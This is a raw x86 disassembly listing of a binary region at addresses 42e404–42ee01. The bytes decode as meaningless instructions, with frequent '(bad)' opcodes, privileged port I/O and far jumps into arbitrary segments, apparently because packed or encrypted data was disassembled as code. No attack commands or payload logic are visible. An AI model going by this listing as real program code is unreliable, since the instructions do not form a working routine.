  42e404:	rcl    DWORD PTR [eax+0x1c],0xf9
  42e408:	cld    
  42e409:	outs   dx,DWORD PTR ds:[esi]
  42e40a:	add    eax,0x35c4dbf9
  42e40f:	mov    al,BYTE PTR [eax]
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	fwait
  42e481:	jns    0x42e4bd
  42e483:	test   eax,0x1ef40
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	cmc    
  42e48d:	icebp  
  42e48e:	(bad)  
  42e48f:	cmp    edi,DWORD PTR [ecx-0x3bdceb93]
  42e495:	fxch   st(2)
  42e497:	lds    edi,FWORD PTR [ebx+0xc]
  42e49a:	xor    bl,BYTE PTR [ebx+0x2448f2ca]
  42e4a0:	(bad)  
  42e4a1:	pop    edx
  42e4a2:	(bad)  
  42e4a4:	retf   0xdca7
  42e4a7:	adc    edi,DWORD PTR [esp+eax*8+0x71]
  42e4ab:	dec    ebp
  42e4ac:	adc    DWORD PTR [eax],edx
  42e4ae:	loop   0x42e4cc
  42e4b0:	mov    dl,0xb
  42e4b2:	inc    ecx
  42e4b3:	dec    eax
  42e4b4:	out    0xda,eax
  42e4b6:	int3   
  42e4b7:	cmp    ch,BYTE PTR [edi-0x12d3ff90]
  42e4bd:	cmp    DWORD PTR [eax],0x77
  42e4c0:	dec    edi
  42e4c1:	ret    0x7aef
  42e4c4:	inc    edx
  42e4c5:	push   ebx
  42e4c6:	inc    edi
  42e4c7:	arpl   WORD PTR [ecx-0x146a0df5],cx
  42e4cd:	cmp    edi,esi
  42e4cf:	les    eax,FWORD PTR ds:0x4b37ccab
  42e4d5:	sub    edx,eax
  42e4d7:	push   cs
  42e4d8:	jno    0x42e4e0
  42e4da:	add    DWORD PTR [ebp-0x4bfac708],edi
  42e4e0:	scas   al,BYTE PTR es:[edi]
  42e4e1:	scas   al,BYTE PTR es:[edi]
  42e4e2:	fstp   QWORD PTR [esi]
  42e4e4:	icebp  
  42e4e5:	sbb    BYTE PTR [ecx-0x5c412bcb],dl
  42e4eb:	cs ja  0x42e487
  42e4ee:	xchg   DWORD PTR [ebx],eax
  42e4f0:	fcmovnbe st,st(0)
  42e4f2:	dec    ebp
  42e4f3:	dec    ebp
  42e4f4:	pop    DWORD PTR [ebx-0x69ca4656]
  42e4fa:	add    eax,0x6fa442cc
  42e500:	mov    ebp,0x8f98339c
  42e505:	stc    
  42e506:	test   eax,0x3e593a17
  42e50b:	pop    ds
  42e50c:	in     eax,0x51
  42e50e:	scas   al,BYTE PTR es:[edi]
  42e50f:	jb     0x42e535
  42e511:	mov    dh,0x57
  42e513:	out    dx,eax
  42e514:	cwde   
  42e515:	mov    esp,0x994afc44
  42e51a:	arpl   si,dx
  42e51c:	(bad)  
  42e51d:	sub    al,0xc5
  42e51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e520:	scas   al,BYTE PTR es:[edi]
  42e521:	repz ror DWORD PTR [ebx+0x16],cl
  42e525:	jmp    0xe516e303
  42e52a:	pop    esi
  42e52b:	inc    eax
  42e52c:	pop    ebp
  42e52d:	dec    ebx
  42e52e:	xchg   esi,ebp
  42e530:	mov    fs,WORD PTR [eax]
  42e532:	xor    eax,0x3105aa27
  42e537:	(bad)  
  42e538:	ss in  al,0xab
  42e53b:	ret    
  42e53c:	add    dl,ch
  42e53e:	bound  esp,QWORD PTR [esi+ebp*8+0x1d914656]
  42e545:	cdq    
  42e546:	(bad)  
  42e547:	push   edi
  42e548:	hlt    
  42e549:	push   esi
  42e54a:	fwait
  42e54b:	jg     0x42e56b
  42e54d:	shl    DWORD PTR [edx],1
  42e54f:	ins    DWORD PTR es:[edi],dx
  42e550:	sub    ecx,DWORD PTR [edx]
  42e552:	rol    BYTE PTR [ecx+eax*2],cl
  42e555:	lock adc dl,0xc5
  42e559:	push   esp
  42e55a:	push   es
  42e55b:	mov    edx,0x29bfaf04
  42e560:	lods   al,BYTE PTR ds:[esi]
  42e561:	(bad)  
  42e563:	rep outs dx,BYTE PTR ds:[esi]
  42e565:	rol    DWORD PTR [ebx+0x3c],cl
  42e568:	fisub  DWORD PTR [edx+0x79]
  42e56b:	dec    edx
  42e56c:	(bad)  
  42e56d:	bound  edx,QWORD PTR [edx-0x44]
  42e570:	cs xchg ebx,eax
  42e572:	mov    edx,0x7173e846
  42e577:	fldenvw [esi+0x19528bb2]
  42e57e:	pop    edx
  42e57f:	jno    0x42e5b8
  42e581:	les    esp,FWORD PTR [ebp+0x2]
  42e584:	pop    eax
  42e585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e586:	in     al,0x4f
  42e588:	clc    
  42e589:	out    dx,ax
  42e58b:	pushf  
  42e58c:	ret    0x4254
  42e58f:	mov    al,ds:0x0
	...
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	mov    ds:0x44bf964b,eax
  42e605:	lock add DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	lods   eax,DWORD PTR ds:[esi]
  42e60d:	cmp    esi,edi
  42e60f:	sub    DWORD PTR [ebx],0xffffffca
  42e612:	repz jns 0x42e59b
  42e615:	cmp    edi,DWORD PTR [ecx+ecx*1-0x28]
  42e619:	retf   
  42e61a:	sbb    bl,BYTE PTR [edx+edi*4]
  42e61d:	xor    al,cl
  42e61f:	inc    ecx
  42e620:	or     ah,ch
  42e622:	call   0x9e4529d6
  42e627:	test   eax,0x1d04a8f0
  42e62c:	(bad)  
  42e62d:	call   0xcd560f49
  42e632:	inc    esi
  42e633:	stos   BYTE PTR es:[edi],al
  42e634:	fs leave 
  42e636:	call   0x3c83:0x98235fb0
  42e63d:	cmp    eax,0x3c98049d
  42e642:	push   edx
  42e643:	out    dx,eax
  42e644:	dec    ebx
  42e645:	dec    ebx
  42e646:	aad    0xe6
  42e648:	jbe    0x42e639
  42e64a:	rcr    BYTE PTR [eax+ecx*2-0x1e],cl
  42e64e:	inc    ebx
  42e64f:	(bad)  
  42e650:	jg     0x42e699
  42e652:	pop    eax
  42e653:	xchg   BYTE PTR [eax+0x6dad32f],ah
  42e659:	add    al,0x2a
  42e65b:	mov    edx,0xb92acff8
  42e660:	out    0xb4,al
  42e662:	sti    
  42e663:	inc    ebp
  42e664:	mov    ds:0xfa460032,eax
  42e669:	out    0x6d,eax
  42e66b:	mov    dl,0xc2
  42e66d:	sub    BYTE PTR [ecx+0x7dc13a85],bh
  42e673:	cmp    DWORD PTR [esi-0x401cbc2c],edx
  42e679:	inc    esi
  42e67a:	xchg   BYTE PTR [edx],dh
  42e67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e67d:	push   cs
  42e67e:	pop    edi
  42e67f:	or     BYTE PTR [esi-0x3f5584d2],ch
  42e685:	cs xchg bh,ah
  42e688:	sub    al,BYTE PTR ds:0x3735e81
  42e68e:	inc    ecx
  42e68f:	pop    eax
  42e690:	lods   al,BYTE PTR ds:[esi]
  42e691:	push   edx
  42e692:	xor    DWORD PTR [edi],edi
  42e694:	pop    es
  42e695:	and    BYTE PTR [ebx*8-0x605e2918],dl
  42e69c:	int    0x9e
  42e69e:	jmp    0x86572ef9
  42e6a3:	sub    esi,DWORD PTR [ebp-0x3809cdd9]
  42e6a9:	sub    eax,0xf4742c3f
  42e6ae:	jecxz  0x42e6b2
  42e6b0:	mov    edi,0x72d74968
  42e6b5:	add    BYTE PTR [edi+0x6e3eca6e],0x99
  42e6bc:	pop    ebp
  42e6bd:	jb     0x42e676
  42e6bf:	ficomp DWORD PTR [esi-0xc267117]
  42e6c5:	outs   dx,BYTE PTR fs:[esi]
  42e6c7:	test   eax,0x44f06e6e
  42e6cc:	pop    esp
  42e6cd:	mov    DWORD PTR [ebp+0x63925bbd],edi
  42e6d3:	hlt    
  42e6d4:	adc    al,ah
  42e6d6:	add    dl,BYTE PTR [ebx]
  42e6d8:	push   ds
  42e6d9:	push   ss
  42e6da:	or     eax,edx
  42e6dc:	mov    WORD PTR [ebp-0x24],ss
  42e6df:	sar    BYTE PTR [di],0xf9
  42e6e3:	call   0xf722:0xd4db76fa
  42e6ea:	pop    edx
  42e6eb:	call   0x7897:0x5a03b01e
  42e6f2:	imul   esp,ecx,0xffffffbc
  42e6f5:	(bad)  
  42e6f6:	mov    ah,0xfb
  42e6f8:	cmp    DWORD PTR [ebp-0x4d],0x60
  42e6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6fd:	hlt    
  42e6fe:	mov    dl,0xbc
  42e700:	cmp    dl,dh
  42e702:	add    al,0xee
  42e704:	lods   al,BYTE PTR ds:[esi]
  42e705:	popa   
  42e706:	test   BYTE PTR [ecx+0x6753642],0x1d
  42e70d:	mov    esi,0xee68
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fisubr DWORD PTR [esi-0x5d]
  42e782:	adc    eax,DWORD PTR [ebx+0x1f148]
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	rol    DWORD PTR [esi+edi*2-0x341c6349],cl
  42e793:	cs in  al,dx
  42e795:	test   eax,0xe0fde830
  42e79a:	push   0x6dd8ccdf
  42e79f:	shr    al,1
  42e7a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7a2:	or     esi,ebx
  42e7a4:	pop    es
  42e7a5:	rcl    dl,0x5
  42e7a8:	mov    bh,0x70
  42e7aa:	sbb    DWORD PTR [ebp+ebp*2-0x49f41471],edi
  42e7b1:	push   ecx
  42e7b2:	bound  edx,QWORD PTR [ebx+0xa]
  42e7b5:	out    dx,eax
  42e7b6:	xchg   edi,eax
  42e7b7:	pop    es
  42e7b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7b9:	sti    
  42e7ba:	cld    
  42e7bb:	add    al,0x54
  42e7bd:	mov    ds:0x53d10531,al
  42e7c2:	ins    DWORD PTR es:[edi],dx
  42e7c3:	push   cs
  42e7c4:	or     edx,DWORD PTR [esi]
  42e7c6:	jmp    0xf5be:0x1ed6b822
  42e7cd:	sbb    bh,dl
  42e7cf:	mov    edi,0xe850c89d
  42e7d4:	or     BYTE PTR [edx+0xf],dl
  42e7d7:	pop    ebx
  42e7d8:	adc    BYTE PTR [edx-0x527510a9],0x1
  42e7df:	or     DWORD PTR [ecx-0x11],ecx
  42e7e2:	dec    ebx
  42e7e3:	inc    esi
  42e7e4:	jb     0x42e7e2
  42e7e6:	dec    ecx
  42e7e7:	push   ds
  42e7e8:	(bad)  
  42e7e9:	sbb    esp,DWORD PTR [edi+0x77]
  42e7ec:	mov    eax,0xf22c6457
  42e7f1:	mov    esp,0x69091de1
  42e7f6:	mov    dl,0x5
  42e7f8:	aad    0xfe
  42e7fa:	sbb    eax,DWORD PTR [esi+0x2b]
  42e7fd:	jg     0x42e818
  42e7ff:	lahf   
  42e800:	inc    ebx
  42e801:	cmp    BYTE PTR [edx],0xbe
  42e804:	daa    
  42e805:	mov    ds:0x4e677abe,eax
  42e80a:	xchg   ecx,eax
  42e80b:	push   ecx
  42e80c:	sbb    eax,0xce3ffec8
  42e811:	xor    ch,BYTE PTR [ebx-0x26]
  42e814:	dec    esi
  42e815:	mov    ecx,eax
  42e817:	fstp   QWORD PTR [ecx+0x64480294]
  42e81d:	jbe    0x42e7d9
  42e81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e820:	cdq    
  42e821:	nop
  42e822:	aas    
  42e823:	dec    edi
  42e824:	pop    ebp
  42e825:	push   DWORD PTR [ebp-0x226a73cb]
  42e82b:	mov    WORD PTR [ebx+0x6eea82a3],fs
  42e831:	cmp    esp,DWORD PTR [ebx-0x7a5ee631]
  42e837:	je     0x42e84e
  42e839:	sbb    eax,0x990f23c3
  42e83e:	pop    ecx
  42e83f:	loop   0x42e823
  42e841:	stos   BYTE PTR es:[edi],al
  42e842:	daa    
  42e843:	or     bl,bh
  42e845:	stos   BYTE PTR es:[edi],al
  42e846:	(bad)  [ecx]
  42e848:	aad    0x90
  42e84a:	pop    ds
  42e84b:	pushf  
  42e84c:	sub    al,BYTE PTR ds:0x3bd2a492
  42e852:	lock repnz fs inc ebp
  42e856:	or     BYTE PTR [edx],0x40
  42e859:	cmp    ch,dh
  42e85b:	mov    edi,esp
  42e85d:	dec    edi
  42e85e:	aam    0x96
  42e860:	sbb    cl,BYTE PTR [edi]
  42e862:	mov    dl,0xeb
  42e864:	popa   
  42e865:	pop    es
  42e866:	mov    ebp,0x69fef5c0
  42e86b:	je     0x42e8da
  42e86d:	dec    esp
  42e86e:	mov    DWORD PTR [esi+0x6c],esp
  42e871:	mov    ds:0xa053f10d,eax
  42e876:	pop    ecx
  42e877:	jmp    0x42e80b
  42e879:	push   0x28
  42e87b:	mov    edx,0xbbff1967
  42e880:	sbb    BYTE PTR [esi+0x3b],cl
  42e883:	aad    0xf7
  42e885:	sbb    DWORD PTR [edi-0xb],esi
  42e888:	xchg   DWORD PTR [ebp+0x44e8f3af],ebp
  42e88e:	(bad)  
  42e88f:	test   DWORD PTR [eax],0x0
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x5f23f82b]
  42e901:	mov    ebp,0xf24ccc89
  42e906:	add    DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	or     al,0xcc
  42e90e:	mov    esp,0x6c2c043e
  42e913:	pop    edi
  42e914:	sbb    BYTE PTR [ecx],ch
  42e916:	cdq    
  42e917:	enter  0x1051,0xde
  42e91b:	int    0x75
  42e91d:	dec    ebx
  42e91e:	jmp    0x45e9:0xa2f17afb
  42e925:	push   esi
  42e926:	adc    DWORD PTR [ebx],esi
  42e928:	or     esi,DWORD PTR [eax-0x5fce71eb]
  42e92e:	add    cl,BYTE PTR [edx+ecx*1]
  42e931:	in     eax,dx
  42e932:	xor    BYTE PTR [eax+edi*4-0x1f],dh
  42e936:	sbb    al,0x22
  42e938:	(bad)  [ecx]
  42e93a:	cwde   
  42e93b:	pop    ebp
  42e93c:	fwait
  42e93d:	enter  0x3cd5,0x18
  42e941:	sti    
  42e942:	(bad)  
  42e943:	jg     0x42e9ad
  42e945:	sbb    edi,DWORD PTR [esi+0x1e9178dd]
  42e94b:	ds loop 0x42e9c3
  42e94e:	push   ebx
  42e94f:	pusha  
  42e950:	push   esi
  42e951:	push   esi
  42e952:	add    eax,0x258eeb16
  42e957:	xchg   ebp,eax
  42e958:	dec    ebx
  42e959:	sub    dl,bl
  42e95b:	sbb    al,0x37
  42e95d:	jmp    0xb7b2:0x56eb710c
  42e964:	popf   
  42e965:	fistp  DWORD PTR [ebp+0x4c]
  42e968:	jmp    0xefe30c45
  42e96d:	inc    edi
  42e96e:	retf   0xc87b
  42e971:	fmul   QWORD PTR ds:0x1f455a2a
  42e977:	in     eax,0x9b
  42e979:	scas   eax,DWORD PTR es:[edi]
  42e97a:	cmp    eax,0x8971bec6
  42e97f:	xchg   BYTE PTR [edx],bl
  42e981:	fcom   DWORD PTR ds:0x4ed491f8
  42e987:	xor    al,0x89
  42e989:	js     0x42e9c3
  42e98b:	std    
  42e98c:	je     0x42e94a
  42e98e:	mov    bh,0xb0
  42e990:	pop    ecx
  42e991:	dec    ebp
  42e992:	adc    BYTE PTR [edi-0x6b9c07de],0xf1
  42e999:	xor    ah,ch
  42e99b:	push   ebp
  42e99c:	lea    ebp,[eax-0x58]
  42e99f:	data16 mov cr2,ebp
  42e9a3:	test   eax,0x6ace4f8d
  42e9a8:	aas    
  42e9a9:	popf   
  42e9aa:	mov    dl,0x9e
  42e9ac:	idiv   DWORD PTR [ebp+0x3ccdbf72]
  42e9b2:	aam    0x49
  42e9b4:	pop    edi
  42e9b5:	cdq    
  42e9b6:	lods   al,BYTE PTR ds:[esi]
  42e9b7:	js     0x42ea35
  42e9b9:	cmp    BYTE PTR [ebx-0x5848ce8b],dh
  42e9bf:	xor    DWORD PTR [ebp+0x200095aa],edx
  42e9c5:	sub    BYTE PTR [ecx+edx*2-0x7c647999],ah
  42e9cc:	std    
  42e9cd:	aam    0x8e
  42e9cf:	fisub  WORD PTR [ecx+0x49599a25]
  42e9d5:	outs   dx,DWORD PTR ds:[esi]
  42e9d6:	push   0xffffffe7
  42e9d8:	imul   ecx,DWORD PTR [ecx],0x4f
  42e9db:	mov    ah,0x1f
  42e9dd:	test   BYTE PTR [eax],al
  42e9df:	or     DWORD PTR [edx+0x5b],0xeeb6727e
  42e9e6:	loopne 0x42ea4a
  42e9e8:	ds pop ecx
  42e9ea:	or     al,0x96
  42e9ec:	lods   eax,DWORD PTR ds:[esi]
  42e9ed:	and    ebx,ebp
  42e9ef:	inc    esp
  42e9f0:	into   
  42e9f1:	fucomi st,st(3)
  42e9f3:	gs popf 
  42e9f5:	sub    eax,0x842328d
  42e9fa:	sub    al,0x96
  42e9fc:	sbb    dh,BYTE PTR [ebp+0x6753a002]
  42ea02:	out    0xf9,eax
  42ea04:	aad    0x38
  42ea06:	outs   dx,DWORD PTR ds:[esi]
  42ea07:	mov    WORD PTR ds:0xb445bb79,ss
  42ea0d:	lods   eax,DWORD PTR ds:[esi]
  42ea0e:	xchg   BYTE PTR [edx],bl
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	sub    al,0xf2
  42ea82:	in     al,dx
  42ea83:	out    dx,eax
  42ea84:	push   eax
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	leave  
  42ea8d:	push   esp
  42ea8e:	std    
  42ea8f:	mov    ch,0x4d
  42ea91:	push   ss
  42ea92:	fwait
  42ea93:	cmp    BYTE PTR [ebx+0x1d],cl
  42ea96:	test   eax,0xe6275111
  42ea9b:	rol    BYTE PTR [ecx],0xdd
  42ea9e:	mov    dh,BYTE PTR [ecx-0x61bf56f6]
  42eaa4:	call   0xa61:0xa67ac2e8
  42eaab:	jg     0x42ea2e
  42eaad:	and    al,0x6a
  42eaaf:	mov    cl,0x7d
  42eab1:	dec    esp
  42eab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eab3:	or     DWORD PTR [ebx+ebx*4+0x56],esi
  42eab7:	push   0xffffffde
  42eab9:	sbb    DWORD PTR ds:0x5e46084b,esp
  42eabf:	pop    edi
  42eac0:	and    ecx,DWORD PTR ds:0x1de4950d
  42eac6:	popa   
  42eac7:	mov    ah,0x51
  42eac9:	dec    ebx
  42eaca:	mov    dh,0xcc
  42eacc:	sbb    al,0xb2
  42eace:	mov    eax,0x5b75f5c7
  42ead3:	les    eax,FWORD PTR [edx]
  42ead5:	sub    ch,BYTE PTR [edx+0x2a5f3869]
  42eadb:	dec    BYTE PTR [eax-0x15]
  42eade:	pop    ebp
  42eadf:	test   dl,cl
  42eae1:	xchg   DWORD PTR [esi],ebp
  42eae3:	mov    edx,0xfb273c6
  42eae8:	scas   eax,DWORD PTR es:[edi]
  42eae9:	jb     0x42eb01
  42eaeb:	mov    ch,0xe2
  42eaed:	jge    0x42eaf9
  42eaef:	push   esi
  42eaf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eaf1:	ja     0x42eaf2
  42eaf3:	or     BYTE PTR [ecx+0x35],bh
  42eaf6:	in     eax,0xdc
  42eaf8:	(bad)
  42eafb:	mov    dh,0xc3
  42eafd:	jnp    0x42eaa2
  42eaff:	pop    esi
  42eb00:	aaa    
  42eb01:	jno    0x42eb4b
  42eb03:	sub    esp,ecx
  42eb05:	inc    esp
  42eb06:	loop   0x42eb45
  42eb08:	in     al,dx
  42eb09:	or     al,0x43
  42eb0b:	adc    dh,bl
  42eb0d:	jne    0x42eaea
  42eb0f:	mov    DWORD PTR [edx],ebx
  42eb11:	es inc esp
  42eb13:	out    dx,al
  42eb14:	dec    esp
  42eb15:	mov    ch,0xe
  42eb17:	test   DWORD PTR [ebx+esi*8+0x45],edi
  42eb1b:	stos   DWORD PTR es:[edi],eax
  42eb1c:	call   0x3ad9:0x1e81b598
  42eb23:	mov    cl,0x14
  42eb25:	push   0xffffff89
  42eb27:	mov    ebx,0xd2ff3832
  42eb2c:	das    
  42eb2d:	cs pop ebp
  42eb2f:	loopne 0x42eaf4
  42eb31:	shr    DWORD PTR [edx+0x2404613f],1
  42eb37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb38:	hlt    
  42eb39:	leave  
  42eb3a:	xor    DWORD PTR [ecx+0x5df1698],ebp
  42eb40:	cmp    ebx,DWORD PTR [ebp-0x4f]
  42eb43:	pop    edi
  42eb44:	mov    cl,0xee
  42eb46:	sub    BYTE PTR [esi-0x1b],ch
  42eb49:	int3   
  42eb4a:	sti    
  42eb4b:	int3   
  42eb4c:	push   ebx
  42eb4d:	jge    0x42ead4
  42eb4f:	ins    BYTE PTR es:[edi],dx
  42eb50:	sti    
  42eb51:	pop    eax
  42eb52:	das    
  42eb53:	icebp  
  42eb54:	test   ah,cl
  42eb56:	cmp    DWORD PTR [eax],esp
  42eb58:	out    0x9,eax
  42eb5a:	clc    
  42eb5b:	push   edx
  42eb5c:	or     eax,0x74d93f06
  42eb61:	(bad)  
  42eb63:	jp     0x42ebab
  42eb65:	test   BYTE PTR [esi+0x4f],bh
  42eb68:	ss in  eax,0xfd
  42eb6b:	sbb    DWORD PTR [eax+0x6602ae11],0x6fd33ac6
  42eb75:	mov    al,0x13
  42eb77:	xor    ebp,DWORD PTR [ecx+0x69baf7a]
  42eb7d:	(bad)
  42eb82:	xor    esi,edi
  42eb84:	fsub   st(6),st
  42eb86:	xor    eax,0x447a5100
  42eb8b:	cmp    eax,0x236505ca
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	and    DWORD PTR [edx+0x547fac55],0x40001f4
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [esi+0x21],cl
  42ec0e:	cmp    BYTE PTR [edi-0x328e4361],al
  42ec14:	retf   
  42ec15:	mov    dh,0xb8
  42ec17:	adc    DWORD PTR [ebx-0x69],eax
  42ec1a:	aaa    
  42ec1b:	sbb    eax,0x65ac5f9d
  42ec20:	push   ecx
  42ec21:	jmp    FWORD PTR [ebx]
  42ec23:	enter  0x479e,0xce
  42ec27:	cmc    
  42ec28:	das    
  42ec29:	test   DWORD PTR [edx],edi
  42ec2b:	in     eax,0x0
  42ec2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec2e:	pop    esp
  42ec2f:	sub    ch,ch
  42ec31:	adc    eax,0x9348e23
  42ec36:	mov    dl,0xb4
  42ec38:	inc    esi
  42ec39:	(bad)  
  42ec3a:	jecxz  0x42ec8e
  42ec3c:	push   ebx
  42ec3d:	idiv   DWORD PTR [ecx+ebx*2-0x5f953a87]
  42ec44:	or     BYTE PTR [edi],ah
  42ec46:	add    al,0xb6
  42ec48:	xchg   edx,eax
  42ec49:	out    dx,eax
  42ec4a:	xchg   DWORD PTR [eax+0x59],ebp
  42ec4d:	and    eax,0x2ada4a15
  42ec52:	sahf   
  42ec53:	pusha  
  42ec54:	retf   
  42ec55:	ja     0x42ecaf
  42ec57:	add    al,0xed
  42ec59:	pop    eax
  42ec5a:	pop    eax
  42ec5b:	hlt    
  42ec5c:	test   eax,0x456e5983
  42ec61:	xor    dl,BYTE PTR [eax+esi*1+0x11]
  42ec65:	jg     0x42ec67
  42ec67:	mov    ch,0x84
  42ec69:	mov    ds,WORD PTR [esi+0x0]
  42ec6c:	lods   al,BYTE PTR ds:[esi]
  42ec6d:	popa   
  42ec6e:	je     0x42ec7a
  42ec70:	push   esi
  42ec71:	sar    ah,cl
  42ec73:	gs sbb eax,0xace32bce
  42ec79:	and    BYTE PTR [ebx],bh
  42ec7b:	test   DWORD PTR [edx-0x76feb7c2],ebp
  42ec81:	mov    esi,0xa2c2c055
  42ec86:	arpl   WORD PTR [eax],cx
  42ec88:	enter  0xbfbd,0x2b
  42ec8c:	and    DWORD PTR [eax-0x61],eax
  42ec8f:	loop   0x42ed10
  42ec91:	mov    ds:0xc9bda377,eax
  42ec96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec97:	js     0x42ecbc
  42ec99:	adc    eax,DWORD PTR [ebp+0x4e74f1ab]
  42ec9f:	xchg   esi,eax
  42eca0:	pop    ebp
  42eca1:	mov    bh,0xc7
  42eca3:	cmp    esi,DWORD PTR [esi]
  42eca5:	cmp    BYTE PTR [edi],ch
  42eca7:	or     al,0xdd
  42eca9:	in     eax,0xac
  42ecab:	(bad)  
  42ecac:	outs   dx,DWORD PTR ds:[esi]
  42ecad:	cmp    BYTE PTR [ebx],ah
  42ecaf:	dec    ebx
  42ecb0:	pop    edx
  42ecb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecb2:	repnz stos DWORD PTR es:[edi],eax
  42ecb4:	add    BYTE PTR [edi],ah
  42ecb6:	push   ecx
  42ecb7:	inc    ebp
  42ecb8:	stos   DWORD PTR es:[edi],eax
  42ecb9:	jns    0x42ecf2
  42ecbb:	add    dl,BYTE PTR [edi]
  42ecbd:	jns    0x42ecb6
  42ecbf:	inc    esi
  42ecc0:	xor    DWORD PTR [esi],eax
  42ecc2:	shl    BYTE PTR [eax+0x59],1
  42ecc5:	jo     0x42ecaa
  42ecc7:	test   BYTE PTR [edi+0x5b],0x64
  42eccb:	mov    al,ds:0x84e81dda
  42ecd0:	hlt    
  42ecd1:	aad    0xaf
  42ecd3:	add    BYTE PTR [edx],dl
  42ecd5:	inc    eax
  42ecd6:	je     0x42ec6d
  42ecd8:	mov    eax,0x9dd64f00
  42ecdd:	pop    eax
  42ecde:	and    eax,0xcfb09fc
  42ece3:	(bad)  
  42ece4:	and    edi,eax
  42ece6:	or     BYTE PTR [edi+ebp*4-0x1398e7f8],0x70
  42ecee:	(bad)  
  42ecef:	std    
  42ecf0:	mov    ch,0xe0
  42ecf2:	dec    esi
  42ecf3:	shl    BYTE PTR [edx+ebp*4],1
  42ecf6:	mov    eax,ds:0xb8e16c71
  42ecfb:	mov    BYTE PTR [edi],bh
  42ecfd:	xor    DWORD PTR ds:0xced9cb57,esp
  42ed03:	mov    ah,0x63
  42ed05:	icebp  
  42ed06:	mov    dl,0x9f
  42ed08:	jbe    0x42ed7c
  42ed0a:	push   esi
  42ed0b:	or     esp,ecx
  42ed0d:	mov    esp,0xb21f
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx-0x44850fee],esp
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	into   
  42ed8d:	mov    ebp,0x470d3a6b
  42ed92:	dec    edx
  42ed93:	xor    al,0xca
  42ed95:	nop    eax
  42ed98:	gs cli 
  42ed9a:	retf   0x5e8f
  42ed9d:	xchg   ecx,eax
  42ed9e:	dec    edx
  42ed9f:	adc    al,0x5a
  42eda1:	shr    ebx,1
  42eda3:	jno    0x42edbb
  42eda5:	xor    DWORD PTR [esi+0x4b],ecx
  42eda8:	out    0x5c,al
  42edaa:	jle    0x42ee18
  42edac:	push   ebp
  42edad:	inc    esi
  42edae:	mov    cl,0x3b
  42edb0:	add    al,0xd1
  42edb2:	jmp    0x42ed98
  42edb4:	or     DWORD PTR [ebp-0x64],edx
  42edb7:	pop    ss
  42edb8:	dec    eax
  42edb9:	sub    al,ch
  42edbb:	mov    ebp,0x6244c295
  42edc0:	or     eax,eax
  42edc2:	and    DWORD PTR [esp+ebp*2-0x54],esp
  42edc6:	pushf  
  42edc7:	sbb    edx,esi
  42edc9:	popf   
  42edca:	into   
  42edcb:	ss sbb esi,ebx
  42edce:	pop    ebx
  42edcf:	cdq    
  42edd0:	(bad)  
  42edd1:	fcomp  DWORD PTR [ecx]
  42edd3:	pusha  
  42edd4:	fimul  WORD PTR [edi]
  42edd6:	cmp    DWORD PTR gs:[edx],ecx
  42edd9:	jne    0x42edae
  42eddb:	or     ecx,ebp
  42eddd:	mov    WORD PTR [esi-0x6800a0c2],gs
  42ede3:	push   0x76228134
  42ede8:	mov    DWORD PTR fs:[ebp-0x7e98b63d],ecx
  42edef:	cmp    DWORD PTR [ebx+0x7e2b9732],edi
  42edf5:	add    DWORD PTR ds:[ecx-0x12907dcc],eax
  42edfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edfd:	push   esi
  42edfe:	add    bh,BYTE PTR [ebx+0x59]
  42ee01:	pushf  
